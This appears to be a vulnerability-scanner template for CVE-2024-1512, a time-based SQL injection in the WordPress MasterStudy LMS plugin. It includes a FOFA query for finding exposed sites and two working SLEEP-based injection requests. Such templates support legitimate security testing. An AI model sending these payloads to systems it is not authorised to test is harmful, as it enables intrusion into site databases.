id: WordPress-MasterStudy-LMS-sql

info:
  name: WordPress MasterStudy LMS插件 SQL延时注入(CVE-2024-1512)
  author: unknown
  severity: high
  description: |-
    fofa: body="wp-content/plugins/masterstudy-lms-learning-management-system/"
    WordPress Plugin MasterStudy LMS 3.2.5 版本及之前版本存在安全漏洞，该漏洞源于对用户提供的参数转义不足，导致可以通过 /lms/stm-lms/order/items REST 路由的 user 参数进行基于联合的 SQL 注入。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/139901296
  tags: sql injection

http:
  - raw:
      - |
        GET /?rest_route=/lms/stm-lms/order/items&author_id=1&user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%283%29%29%29sauT%29+AND+%283071%3D3071 HTTP/1.1 
        Host: {{Hostname}}
      - |
        GET /?rest_route=/lms/stm-lms/order/items&author_id=1&user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%286%29%29%29sauT%29+AND+%283071%3D3071 HTTP/1.1 
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
            - 'duration_1>=6 && duration_1<=7'  
            - 'duration_2>=12 && duration_2<=13'  
      - type: status
        status: 
          - 200




